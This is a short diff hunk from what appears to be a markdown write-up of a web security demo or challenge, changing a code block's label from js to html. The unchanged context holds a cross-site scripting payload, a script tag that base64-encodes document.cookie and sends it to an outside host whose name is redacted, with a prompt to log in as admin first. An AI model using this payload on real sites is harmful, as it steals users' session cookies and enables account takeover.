@@ -80,7 +80,7 @@ jk the demo did work I was just dumb
 
 > 👉 Login as admin first 👈
 
-```js
+```html
 <script>
   fetch("https://[...]/?v="+btoa(document.cookie))
 </script>aaa
